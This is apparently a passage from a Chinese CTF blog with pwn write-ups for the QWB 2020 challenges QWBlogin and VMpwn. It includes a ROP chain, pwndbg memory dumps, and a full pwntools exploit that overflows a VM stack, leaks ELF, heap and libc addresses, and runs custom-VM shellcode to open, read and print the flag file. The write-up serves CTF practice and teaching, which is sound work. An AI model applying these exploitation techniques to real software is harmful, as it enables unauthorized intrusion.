class="hljs-comment"># open(data[0x100], 0)</span><span class="hljs-comment"># r00 = 0 r01 = 0x200 r02 = 0</span>payload += p64(pop_r00_ret) + p64(<span class="hljs-number">0</span>) + p64(pop_r01_ret) + p64(<span class="hljs-number">0x100</span>) + p64(pop_r02_ret) + p64(<span class="hljs-number">0</span>)payload += p64(sys_open_ret)<span class="hljs-comment"># read(4, data[0x100], 0x30)</span><span class="hljs-comment"># r00 = 1 r01 = 4 r02 = 0x100 r03 = 0x30</span>payload += p64(pop_r00_ret) + p64(<span class="hljs-number">1</span>) + p64(pop_r01_ret) + p64(<span class="hljs-number">0x4</span>) + p64(pop_r02_ret) + p64(<span class="hljs-number">0x100</span>) + p64(pop_r03_ret) + p64(<span class="hljs-number">0x30</span>)payload += p64(sys_data_ret)<span class="hljs-comment"># write(1, data[0x100], 0x30)</span><span class="hljs-comment"># r00 = 2 r01 = 1 r02 = 0x100 r03 = 0x30</span>payload += p64(pop_r00_ret) + p64(<span class="hljs-number">2</span>) + p64(pop_r01_ret) + p64(<span class="hljs-number">0x1</span>) + p64(pop_r02_ret) + p64(<span class="hljs-number">0x100</span>) + p64(pop_r03_ret) + p64(<span class="hljs-number">0x30</span>)payload += p64(sys_data_ret)</code></pre><p>强的大佬，不需要<code>instruction.h</code>都能在5个小时内做出来，而我就是只菜鸡</p><p><a href="https://github.com/Vang3lis/CTF_repo/tree/master/QWB_2020/QWBlogin">QWBlogin 题目</a></p><h2 id="VMpwn"><a href="#VMpwn" class="headerlink" title="VMpwn"></a>VMpwn</h2><p>这个题目跟上一个题目一样先逆向，但是这个题目跟<code>QWBlogin</code>相比实现<code>vm</code>的时候简单一些</p><p>其中有一个 <code>chunk 0x30</code>用来记录寄存器的值<code>vm[0] vm[1] vm[2]</code> 类似<code>rdi, rsi, rdx</code>在<code>syscall</code>时会用到，<code>vm[3]</code>为<code>sp</code>，<code>vm[5]</code>为 <code>pc</code></p><p>在最后的关键操作为对于<code>read(0, stack, 0x1000)</code>（栈只有<code>0x100</code>个字节）</p><pre><code class="hljs assembly">pwndbg&gt; distance 0x555555759050 0x55555575ad680x555555759050-&gt;0x55555575ad68 is 0x1d18 bytes (0x3a3 words) RAX  0x7ffff7b156c0 (read) ◂— cmp    dword ptr [rip + 0x2c3039], 0 ► 0x5555555555db    call   rax &lt;0x7ffff7b156c0&gt;        fd: 0x0        buf: 0x55555575ad68 ◂— 0x0        nbytes: 0x1000pwndbg&gt; telescope 0x55555575801000:0000│   0x555555758010 ◂— 0x001:0008│   0x555555758018 —▸ 0x55555575ad68 ◂— 0x002:0010│   0x555555758020 ◂— 0x100003:0018│   0x555555758028 —▸ 0x55555575ad68 ◂— 0x004:0020│   0x555555758030 ◂— 0x005:0028│   0x555555758038 —▸ 0x5555557572d6 ◂— 0x772c6b6f11028f10</code></pre><p>然后<code>puts(stack)</code>，可以看到该虚拟栈上有<code>heap</code>地址和<code>elf</code>地址，但是只能泄漏一个</p><pre><code class="hljs assembly">pwndbg&gt; telescope 0x55555575ad68 0x3000:0000│ rsi  0x55555575ad68 ◂— &#39;1234454636\n&#39;01:0008│      0x55555575ad70 ◂— 0xa3633 &#x2F;* &#39;36\n&#39; *&#x2F;02:0010│      0x55555575ad78 ◂— 0x0... ↓1e:00f0│      0x55555575ae58 —▸ 0x555555758050 ◂— 0x20746168772c6b6f (&#39;ok,what &#39;)1f:00f8│      0x55555575ae60 ◂— 0x020:0100│      0x55555575ae68 —▸ 0x555555757851 ◂— 0xff</code></pre><p>接下来同第一步的<code>read(0, stack, 0x1000)</code> <code>write(0, stack, 0x20)</code>然后<code>ret</code></p><p>这个程序中有一个两个比较奇怪的地方，由于<code>ret</code>的时候程序的实现，是将<code>sp-=8</code>，但是<code>PUSH</code>为<code>sp-=8</code> <code>POP</code>为<code>sp+=8</code>，因此<code>ret</code>的时候比较奇怪，另外就是与<code>QWBlogin</code>相比没有 什么能用的<code>gadget</code>，因此想法只能为按照<code>vm</code>的规则，写<code>shellocde</code>，然后在最后<code>ret</code>的时候跳转过去，但是该题用 <code>seccomp</code>限制了只能 <code>orw</code>，且没有给<code>open</code>的 <code>syscall</code>只能泄漏</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>因此思路就是，先利用<code>puts</code>泄漏<code>elf</code>的地址，然后再<code>ret</code>到最初<code>elf_code+0x3</code>然后再泄漏<code>heap</code>，<code>ret</code>到写入栈上的<code>shellcode</code></p><p>利用<code>puts</code>泄漏<code>libc</code>，然后再次输入到栈上，利用<code>\x6d: mov reg[0], 0</code>作为<code>nop</code>，编写<code>shellcode</code></p><p>然后将<code>open</code>写入<code>free</code>的位置，因此在调用<code>syscall 03</code>时就是调用<code>open</code>，最后利用<code>orw</code>进行读取<code>flag</code></p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><pre><code class="hljs python"><span class="hljs-comment"># heap+0x2e68 =&gt; elf_bss</span>io.sendafter(<span class="hljs-string">&quot;name:&quot;</span>, <span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">0xff</span>+<span class="hljs-string">&quot;#&quot;</span>)io.recvuntil(<span class="hljs-string">&quot;#&quot;</span>)elf.address = u64(io.recvn(<span class="hljs-number">6</span>) + <span class="hljs-string">&quot;\x00\x00&quot;</span>) - <span class="hljs-number">0x203851</span>success(<span class="hljs-string">&quot;elf&quot;</span>, elf.address)<span class="hljs-comment"># 0xf8 + ret </span>io.sendafter(<span class="hljs-string">&quot;say:&quot;</span>, <span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">0x100</span> + p64(elf.address + <span class="hljs-number">0x203023</span>))io.sendafter(<span class="hljs-string">&quot;name:&quot;</span>, <span class="hljs-string">&quot;\x50&quot;</span>)heap = u64(io.recvn(<span class="hljs-number">6</span>) + <span class="hljs-string">&quot;\x00\x00&quot;</span>) - <span class="hljs-number">0x50</span>success(<span class="hljs-string">&quot;heap&quot;</span>, heap)<span class="hljs-string">&#x27;&#x27;&#x27;</span><span class="hljs-string">mov reg[0], read_got</span><span class="hljs-string">puts</span><span class="hljs-string">mov reg[0], 0</span><span class="hljs-string">mov reg[1], heap + addr</span><span class="hljs-string">mov reg[2], 0x1000</span><span class="hljs-string">read        </span><span class="hljs-string">//  use 0x6d: mov reg[0], 0 as nop</span><span class="hljs-string">&#x27;&#x27;&#x27;</span>payload = <span class="hljs-string">&quot;\x11&quot;</span> + p64(elf.got[<span class="hljs-string">&#x27;read&#x27;</span>])payload += <span class="hljs-string">&quot;\x8f\x02&quot;</span>payload += <span class="hljs-string">&quot;\x6d&quot;</span>payload += <span class="hljs-string">&quot;\x12&quot;</span> + p64(heap+<span class="hljs-number">0x2d60</span>)payload += <span class="hljs-string">&quot;\x13&quot;</span> + p64(<span class="hljs-number">0x1000</span>)payload += <span class="hljs-string">&quot;\x8f\x00&quot;</span>payload = payload.ljust(<span class="hljs-number">0x100</span>, <span class="hljs-string">&quot;A&quot;</span>)payload += p64(heap+<span class="hljs-number">0x2d60</span>)io.sendafter(<span class="hljs-string">&quot;say:&quot;</span>, payload)io.recvuntil(<span class="hljs-string">&quot;bye~\n&quot;</span>)libc.address = u64(io.recvuntil(<span class="hljs-string">&quot;\n&quot;</span>, drop=<span class="hljs-literal">True</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&quot;\x00&quot;</span>)) - libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<span class="hljs-string">&#x27;&#x27;&#x27;</span><span class="hljs-string">flag</span><span class="hljs-string">0x6d * 0x50</span><span class="hljs-string">mov reg[1], elf.address+0x203900</span><span class="hljs-string">mov reg[2], 8</span><span class="hljs-string">read</span><span class="hljs-string">mov reg[0], heap+0x2d60</span><span class="hljs-string">mov reg[1], 0</span><span class="hljs-string">open</span><span class="hljs-string">mov reg[0], 3</span><span class="hljs-string">mov reg[1], bss</span><span class="hljs-string">mov reg[2], 0x30</span><span class="hljs-string">read</span><span class="hljs-string">mov reg[0], 1</span><span class="hljs-string">mov reg[1], bss</span><span class="hljs-string">mov reg[2], 0x30</span><span class="hljs-string">write</span><span class="hljs-string">&#x27;&#x27;&#x27;</span>payload = <span class="hljs-string">&quot;flag\x00&quot;</span>payload = payload.ljust(<span class="hljs-number">0x50</span>, <span class="hljs-string">&quot;\x6d&quot;</span>)payload += <span class="hljs-string">&quot;\x12&quot;</span> + p64(elf.address+<span class="hljs-number">0x2038f8</span>)payload += <span class="hljs-string">&quot;\x13&quot;</span> + p64(<span class="hljs-number">8</span>)payload += <span class="hljs-string">&quot;\x8f\x00&quot;</span>payload += <span class="hljs-string">&quot;\x11&quot;</span> + p64(heap+<span class="hljs-number">0x2d60</span>)payload += <span class="hljs-string">&quot;\x6e&quot;</span>payload += <span class="hljs-string">&quot;\x8f\x03&quot;</span>payload += <span class="hljs-string">&quot;\x11&quot;</span> + p64(<span class="hljs-number">3</span>)payload += <span class="hljs-string">&quot;\x12&quot;</span> + p64(elf.bss()+<span class="hljs-number">0x400</span>)payload += <span class="hljs-string">&quot;\x13&quot;</span> + p64(<span class="hljs-number">0x30</span>)payload += <span class="hljs-string">&quot;\x8f\x00&quot;</span>payload += <span class="hljs-string">&quot;\x11&quot;</span> + p64(<span class="hljs-number">1</span>)payload += <span class="hljs-string">&quot;\x12&quot;</span> + p64(elf.bss()+<span class="hljs-number">0x400</span>)payload += <span class="hljs-string">&quot;\x13&quot;</span> + p64(<span class="hljs-number">0x30</span>)payload += <span class="hljs-string">&quot;\x8f\x01&quot;</span>io.send(payload)sleep(<span class="hljs-number">0.03</span>)io.send(p64(libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>]))io.interactive()io.close()</code></pre>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>re</tag>
      
      <tag>vm</tag>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
